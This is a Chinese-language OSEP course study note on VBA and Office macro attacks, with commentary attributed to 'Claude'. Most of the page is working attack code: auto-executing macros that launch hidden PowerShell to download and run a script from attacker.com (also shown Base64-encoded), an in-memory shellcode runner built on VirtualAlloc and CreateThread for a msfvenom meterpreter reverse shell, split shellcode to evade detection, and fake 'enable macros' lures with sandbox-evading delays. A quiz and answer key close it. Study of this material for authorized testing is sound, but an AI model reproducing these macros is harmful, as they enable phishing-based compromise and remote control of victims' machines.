---
title: OSEP-03-VBA基础
description: '03-Office宏攻击 | 01-VBA基础'
pubDate: 2026-01-30T00:00:10+08:00
image: /image/fengmian/OSEP.png
categories:
  - Documentation
  - OffSec
tags:
  - PEN-300-OSEP
  - Windows Learning
  - Exploit Development
  - Phishing
---

# Module 03: VBA 基础与 Office 宏

---

## 【Claude的学习建议】

> **这是OSEP最重要的章节之一！**
>
> Office宏攻击是现实世界中最常见的初始访问方式。钓鱼邮件+恶意文档的组合，至今仍然是攻击者最喜欢的手段。
>
> **学习目标**：
> 1. 理解VBA是什么，能写简单的VBA代码
> 2. 理解宏是如何自动执行的
> 3. 理解如何通过VBA调用Windows API
> 4. 最终目标：能写一个在内存中执行shellcode的宏
>
> **给零基础同学的话**：
> - VBA语法很简单，比Python还简单
> - 不需要安装任何开发环境，Word/Excel自带
> - 边学边敲代码，很快就能上手

---

## 第三节：VBA 基础

### 什么是 VBA？

**VBA (Visual Basic for Applications)** 是微软 Office 套件内置的编程语言，可以：

- 自动化 Office 任务
- 创建自定义功能
- **执行系统命令和恶意代码**（OSEP 重点）

> 【Claude的通俗解释】
>
> **VBA就是Office的"脚本语言"**
>
> 想象一下：
> - Word/Excel 是一个"机器人"
> - VBA 是给机器人的"指令"
> - 你可以让机器人做任何事：打开文件、发送邮件、甚至执行系统命令
>
> **为什么VBA危险？**
> - VBA可以调用Windows API（操作系统的底层功能）
> - VBA可以执行PowerShell命令
> - VBA可以在内存中执行shellcode
> - 而用户只是"打开了一个Word文档"
>
> **现实中的攻击场景**：
> ```
> 1. 攻击者发送钓鱼邮件："请查看附件中的发票"
> 2. 受害者打开Word文档
> 3. Word提示"是否启用宏"
> 4. 受害者点击"启用"
> 5. 宏自动执行，攻击者获得控制权
> ```

---

## 一、VBA 基础语法

### 1.1 变量声明

```vba
' 声明变量
Dim name As String
Dim age As Integer
Dim price As Double
Dim isActive As Boolean

' 赋值
name = "Alice"
age = 25
price = 99.99
isActive = True

' 变体类型 (可以存储任何类型)
Dim anything As Variant
anything = "Hello"
anything = 123
```

### 1.2 数据类型

| 类型 | 说明 | 大小 |
|------|------|------|
| Byte | 0-255 | 1 字节 |
| Integer | -32768 到 32767 | 2 字节 |
| Long | 长整数 | 4 字节 |
| LongPtr | 指针 (32/64位自适应) | 4/8 字节 |
| Single | 单精度浮点 | 4 字节 |
| Double | 双精度浮点 | 8 字节 |
| String | 字符串 | 可变 |
| Boolean | True/False | 2 字节 |
| Variant | 任意类型 | 可变 |

> 【Claude的重点提醒】
>
> **OSEP中最重要的类型**：
>
> 1. **LongPtr** - 指针类型，用于存储内存地址
>    - 32位Office：4字节
>    - 64位Office：8字节
>    - 调用Windows API时经常用到
>
> 2. **Byte** - 字节类型，用于存储shellcode
>    - shellcode就是一堆字节
>    - `Dim shellcode() As Byte`
>
> 3. **Variant** - 万能类型
>    - 可以存任何东西
>    - 常用于存储shellcode数组
>    - `buf = Array(252, 72, 131, ...)`

### 1.3 数组

```vba
' 静态数组
Dim arr(10) As Integer  ' 0-10，共 11 个元素
Dim matrix(3, 3) As Integer  ' 二维数组

' 动态数组
Dim dynArr() As Byte
ReDim dynArr(100)  ' 分配大小
ReDim Preserve dynArr(200)  ' 保留数据并扩展

' 字节数组 (shellcode 常用)
Dim shellcode() As Byte
shellcode = Array(&Hfc, &H48, &H83, &He4, &Hf0)
```

### 1.4 控制流

```vba
' If 语句
If condition Then
    ' 代码
ElseIf anotherCondition Then
    ' 代码
Else
    ' 代码
End If

' Select Case
Select Case value
    Case 1
        ' 代码
    Case 2, 3
        ' 代码
    Case Else
        ' 代码
End Select

' For 循环
For i = 0 To 10
    ' 代码
Next i

' For Each 循环
For Each item In collection
    ' 代码
Next item

' Do While 循环
Do While condition
    ' 代码
Loop

' Do Until 循环
Do Until condition
    ' 代码
Loop
```

### 1.5 函数和子程序

```vba
' 子程序 (无返回值)
Sub SayHello()
    MsgBox "Hello!"
End Sub

' 带参数的子程序
Sub Greet(name As String)
    MsgBox "Hello, " & name
End Sub

' 函数 (有返回值)
Function Add(a As Integer, b As Integer) As Integer
    Add = a + b
End Function

' 调用
Call SayHello()
Greet "Alice"
result = Add(5, 3)
```

---

## 二、Office 宏基础

> 【Claude的重点说明】
>
> **这部分是OSEP的核心！**
>
> 宏的"自动执行"功能是攻击的关键。用户只要打开文档并启用宏，代码就会自动运行。

### 2.1 创建宏

1. 打开 Word/Excel
2. 按 `Alt + F11` 打开 VBA 编辑器
3. 插入模块：`Insert → Module`
4. 编写代码

> 【Claude的实操指南】
>
> **第一次创建宏的步骤（跟着做一遍）**：
>
> 1. 打开Word，新建一个空白文档
> 2. 按 `Alt + F11`，会弹出VBA编辑器窗口
> 3. 在左侧"工程"窗口，右键点击"ThisDocument"
> 4. 选择"插入" → "模块"
> 5. 在右侧代码窗口输入：
>    ```vba
>    Sub Test()
>        MsgBox "Hello, Hacker!"
>    End Sub
>    ```
> 6. 按 `F5` 运行，会弹出消息框
> 7. 保存文档时选择 `.docm` 格式（启用宏的文档）

### 2.2 自动执行宏

```vba
' Word 文档打开时自动执行
Sub AutoOpen()
    MsgBox "文档已打开"
End Sub

' Word 新建文档时自动执行
Sub AutoNew()
    MsgBox "新文档已创建"
End Sub

' Excel 工作簿打开时自动执行
Sub Workbook_Open()
    MsgBox "工作簿已打开"
End Sub

' 文档关闭时执行
Sub AutoClose()
    MsgBox "文档即将关闭"
End Sub
```

> 【Claude的深入解释】
>
> **自动执行宏的原理**：
>
> Office会在特定事件发生时，自动查找并执行特定名称的宏：
>
> | 宏名称 | 触发时机 | 应用程序 |
> |--------|----------|----------|
> | `AutoOpen` | 打开文档时 | Word |
> | `Document_Open` | 打开文档时 | Word（另一种写法） |
> | `AutoNew` | 新建文档时 | Word |
> | `AutoClose` | 关闭文档时 | Word |
> | `Workbook_Open` | 打开工作簿时 | Excel |
> | `Auto_Open` | 打开工作簿时 | Excel（旧版兼容） |
>
> **攻击者的做法**：
> ```vba
> Sub AutoOpen()
>     ' 用户打开文档，这里的代码自动执行
>     ' 可以是下载执行恶意程序
>     ' 可以是执行shellcode
>     ' 可以是反弹shell
> End Sub
> ```
>
> **为什么要同时写 AutoOpen 和 Document_Open？**
> - 不同版本的Word可能只识别其中一个
> - 为了兼容性，通常两个都写

### 2.3 执行系统命令

```vba
' 方法 1: Shell 函数
Sub RunCommand()
    Dim result As Double
    result = Shell("calc.exe", vbNormalFocus)
End Sub

' 方法 2: WScript.Shell
Sub RunWithWScript()
    Dim wsh As Object
    Set wsh = CreateObject("WScript.Shell")
    wsh.Run "calc.exe", 0, False  ' 0=隐藏窗口, False=不等待
End Sub

' 方法 3: 执行 PowerShell
Sub RunPowerShell()
    Dim wsh As Object
    Set wsh = CreateObject("WScript.Shell")
    wsh.Run "powershell -ep bypass -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')""", 0, False
End Sub
```

> 【Claude的深入解析】
>
> **三种方法的对比**：
>
> | 方法 | 优点 | 缺点 | 隐蔽性 |
> |------|------|------|--------|
> | Shell函数 | 简单直接 | 会弹出窗口 | 低 |
> | WScript.Shell | 可以隐藏窗口 | 需要创建COM对象 | 中 |
> | PowerShell | 功能强大，可下载执行 | 可能被AMSI拦截 | 中 |
>
> **参数解释**：
>
> `wsh.Run "命令", 窗口样式, 是否等待`
> - 窗口样式：0=隐藏, 1=正常, 2=最小化
> - 是否等待：True=等命令执行完, False=不等待
>
> **PowerShell命令解析**：
> ```
> powershell -ep bypass -w hidden -c "..."
>
> -ep bypass    = ExecutionPolicy bypass（绕过执行策略）
> -w hidden     = WindowStyle hidden（隐藏窗口）
> -c "..."      = Command（要执行的命令）
>
> IEX (New-Object Net.WebClient).DownloadString('URL')
> = 下载URL的内容并执行（下载摇篮技术）
> ```
>
> **安全提示**：这些技术仅用于授权的渗透测试！

---

## 三、调用 Win32 API

> 【Claude的重要说明】
>
> **这是VBA攻击的核心技术！**
>
> VBA本身功能有限，但通过调用Win32 API，可以做到几乎任何事情：
> - 分配可执行内存
> - 在内存中执行shellcode
> - 注入代码到其他进程
> - 绕过各种安全限制
>
> **你需要理解的核心概念**：
> 1. `Declare` 语句：告诉VBA如何调用外部DLL函数
> 2. `PtrSafe`：64位Office必须加这个关键字
> 3. `LongPtr`：指针类型，32/64位自适应

### 3.1 API 声明

```vba
' 32 位声明
#If VBA7 Then
    ' 64 位 Office
    Private Declare PtrSafe Function MessageBoxA Lib "user32.dll" ( _
        ByVal hWnd As LongPtr, _
        ByVal lpText As String, _
        ByVal lpCaption As String, _
        ByVal uType As Long) As Long

    Private Declare PtrSafe Function VirtualAlloc Lib "kernel32.dll" ( _
        ByVal lpAddress As LongPtr, _
        ByVal dwSize As Long, _
        ByVal flAllocationType As Long, _
        ByVal flProtect As Long) As LongPtr

    Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32.dll" ( _
        ByVal dest As LongPtr, _
        ByRef src As Any, _
        ByVal length As Long) As LongPtr

    Private Declare PtrSafe Function CreateThread Lib "kernel32.dll" ( _
        ByVal lpThreadAttributes As LongPtr, _
        ByVal dwStackSize As Long, _
        ByVal lpStartAddress As LongPtr, _
        ByVal lpParameter As LongPtr, _
        ByVal dwCreationFlags As Long, _
        ByRef lpThreadId As Long) As LongPtr
#Else
    ' 32 位 Office
    Private Declare Function MessageBoxA Lib "user32.dll" ( _
        ByVal hWnd As Long, _
        ByVal lpText As String, _
        ByVal lpCaption As String, _
        ByVal uType As Long) As Long

    Private Declare Function VirtualAlloc Lib "kernel32.dll" ( _
        ByVal lpAddress As Long, _
        ByVal dwSize As Long, _
        ByVal flAllocationType As Long, _
        ByVal flProtect As Long) As Long
#End If
```

> 【Claude的逐行解析】
>
> **Declare语句的结构**：
> ```vba
> Private Declare PtrSafe Function 函数名 Lib "DLL名" (参数列表) As 返回类型
> ```
>
> **关键字解释**：
> - `Private`：只在当前模块可用
> - `Declare`：声明外部函数
> - `PtrSafe`：64位兼容（Office 2010+必须）
> - `Function`：有返回值（用`Sub`表示无返回值）
> - `Lib "xxx.dll"`：函数所在的DLL文件
>
> **参数传递方式**：
> - `ByVal`：按值传递（传递数据的副本）
> - `ByRef`：按引用传递（传递数据的地址）
>
> **为什么要用 `#If VBA7 Then`？**
> - 这是条件编译，根据Office版本选择不同的声明
> - VBA7 = Office 2010及以后版本
> - 64位Office必须用`PtrSafe`和`LongPtr`
> - 32位Office用`Long`就够了

### 3.2 调用示例

```vba
Sub CallMessageBox()
    Dim result As Long
    result = MessageBoxA(0, "Hello from VBA!", "Test", 0)
End Sub
```

---

## 四、VBA Shellcode 执行器

### 4.1 基本 Shellcode 执行器

```vba
' API 声明
#If VBA7 Then
    Private Declare PtrSafe Function VirtualAlloc Lib "kernel32.dll" ( _
        ByVal lpAddress As LongPtr, _
        ByVal dwSize As Long, _
        ByVal flAllocationType As Long, _
        ByVal flProtect As Long) As LongPtr

    Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32.dll" ( _
        ByVal dest As LongPtr, _
        ByRef src As Any, _
        ByVal length As Long) As LongPtr

    Private Declare PtrSafe Function CreateThread Lib "kernel32.dll" ( _
        ByVal lpThreadAttributes As LongPtr, _
        ByVal dwStackSize As Long, _
        ByVal lpStartAddress As LongPtr, _
        ByVal lpParameter As LongPtr, _
        ByVal dwCreationFlags As Long, _
        ByRef lpThreadId As Long) As LongPtr
#End If

' 常量
Const MEM_COMMIT = &H1000
Const MEM_RESERVE = &H2000
Const PAGE_EXECUTE_READWRITE = &H40

Sub AutoOpen()
    RunShellcode
End Sub

Sub RunShellcode()
    Dim shellcode As Variant
    Dim shellcodeBytes() As Byte
    Dim addr As LongPtr
    Dim hThread As LongPtr
    Dim threadId As Long
    Dim i As Long

    ' Shellcode (msfvenom 生成)
    ' msfvenom -p windows/x64/meterpreter/reverse_https LHOST=x.x.x.x LPORT=443 -f vbapplication
    ' 注意：下面只保留少量示例字节。实际使用时请粘贴完整输出，不要在 Array 续行中插入注释。
    shellcode = Array( _
        &Hfc, &H48, &H83, &He4, &Hf0, &He8, &Hc0, &H0, &H0, &H0, &H41, &H51, _
        &H41, &H50, &H52, &H51, &H56, &H48, &H31, &Hd2, &H65, &H48, &H8b, &H52, _
        &H0, &H0, &H0)

    ' 转换为字节数组
    ReDim shellcodeBytes(UBound(shellcode))
    For i = 0 To UBound(shellcode)
        shellcodeBytes(i) = shellcode(i)
    Next i

    ' 分配可执行内存
    addr = VirtualAlloc(0, UBound(shellcodeBytes) + 1, MEM_COMMIT + MEM_RESERVE, PAGE_EXECUTE_READWRITE)

    ' 复制 shellcode 到内存
    RtlMoveMemory addr, shellcodeBytes(0), UBound(shellcodeBytes) + 1

    ' 创建线程执行
    hThread = CreateThread(0, 0, addr, 0, 0, threadId)
End Sub
```

### 4.2 分段 Shellcode (绕过检测)

```vba
Sub RunShellcode()
    Dim sc1 As Variant, sc2 As Variant, sc3 As Variant
    Dim shellcode() As Byte
    Dim totalSize As Long

    ' 分段存储 shellcode
    sc1 = Array(&Hfc, &H48, &H83, &He4, &Hf0, &He8, &Hc0, &H0, &H0, &H0)
    sc2 = Array(&H41, &H51, &H41, &H50, &H52, &H51, &H56, &H48, &H31, &Hd2)
    sc3 = Array(&H65, &H48, &H8b, &H52, &H60, &H48, &H8b, &H52, &H18, &H48)

    ' 合并
    totalSize = UBound(sc1) + UBound(sc2) + UBound(sc3) + 3
    ReDim shellcode(totalSize)

    ' 复制各段
    Dim pos As Long
    pos = 0
    CopyArray shellcode, pos, sc1
    pos = pos + UBound(sc1) + 1
    CopyArray shellcode, pos, sc2
    pos = pos + UBound(sc2) + 1
    CopyArray shellcode, pos, sc3

    ' 执行...
End Sub

Sub CopyArray(dest() As Byte, startPos As Long, src As Variant)
    Dim i As Long
    For i = 0 To UBound(src)
        dest(startPos + i) = src(i)
    Next i
End Sub
```

---

## 五、集成 PowerShell

### 5.1 执行 PowerShell 命令

```vba
Sub RunPowerShell()
    Dim wsh As Object
    Dim cmd As String

    Set wsh = CreateObject("WScript.Shell")

    ' 简单命令
    cmd = "powershell -ep bypass -w hidden -c ""whoami"""
    wsh.Run cmd, 0, False
End Sub
```

### 5.2 下载并执行

```vba
Sub DownloadAndExecute()
    Dim wsh As Object
    Dim cmd As String

    Set wsh = CreateObject("WScript.Shell")

    ' 下载并执行 PowerShell 脚本
    cmd = "powershell -ep bypass -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"""
    wsh.Run cmd, 0, False
End Sub
```

### 5.3 Base64 编码执行

```vba
Sub RunEncodedPowerShell()
    Dim wsh As Object
    Dim encoded As String
    Dim cmd As String

    Set wsh = CreateObject("WScript.Shell")

    ' Base64 编码的 PowerShell 命令
    ' 原始命令: IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')
    encoded = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYQB0AHQAYQBjAGsAZQByAC4AYwBvAG0ALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA=="

    cmd = "powershell -ep bypass -w hidden -enc " & encoded
    wsh.Run cmd, 0, False
End Sub
```

---

## 六、社会工程技巧

### 6.1 伪装宏

```vba
Sub AutoOpen()
    ' 显示假的错误消息
    MsgBox "This document was created in an older version of Microsoft Word." & vbCrLf & _
           "Please enable macros to view the content.", vbExclamation, "Microsoft Word"

    ' 执行恶意代码
    RunPayload
End Sub

Sub RunPayload()
    ' 恶意代码
End Sub
```

### 6.2 隐藏宏执行

```vba
Sub AutoOpen()
    ' 禁用屏幕更新
    Application.ScreenUpdating = False

    ' 禁用警告
    Application.DisplayAlerts = False

    ' 执行恶意代码
    RunPayload

    ' 恢复设置
    Application.ScreenUpdating = True
    Application.DisplayAlerts = True
End Sub
```

### 6.3 延迟执行

```vba
Sub AutoOpen()
    ' 延迟执行，绕过沙箱检测
    Application.OnTime Now + TimeValue("00:00:05"), "RunPayload"
End Sub

Sub RunPayload()
    ' 5 秒后执行
End Sub
```

---

## 七、章节测试

### 选择题

1. VBA 中声明 64 位兼容指针类型应使用？
   - A) Long
   - B) Integer
   - C) LongPtr
   - D) Pointer

2. Word 文档打开时自动执行的宏名称是？
   - A) Auto_Open
   - B) AutoOpen
   - C) Document_Open
   - D) OnOpen

3. VBA 中调用 Win32 API 需要使用哪个关键字？
   - A) Import
   - B) Declare
   - C) External
   - D) DllImport

4. `VirtualAlloc` 的 `PAGE_EXECUTE_READWRITE` 值是？
   - A) &H10
   - B) &H20
   - C) &H40
   - D) &H80

5. 以下哪个不是 VBA 的数据类型？
   - A) Variant
   - B) LongPtr
   - C) IntPtr
   - D) Byte

### 编程题

1. 编写一个 VBA 宏，在文档打开时显示一个消息框，内容为 "Hello OSEP"。

2. 编写一个 VBA 宏，使用 WScript.Shell 执行 `calc.exe`。

### 答案

**选择题**：1-C, 2-B, 3-B, 4-C, 5-C

**编程题参考答案**：

```vba
' 1. 消息框
Sub AutoOpen()
    MsgBox "Hello OSEP", vbInformation, "OSEP"
End Sub

' 2. 执行计算器
Sub AutoOpen()
    Dim wsh As Object
    Set wsh = CreateObject("WScript.Shell")
    wsh.Run "calc.exe", 1, False
End Sub
```

---

**下一节**：[03-VBA-Shellcode执行器.md](/blog/osep/03-office宏攻击/03-vba-shellcode执行器/)
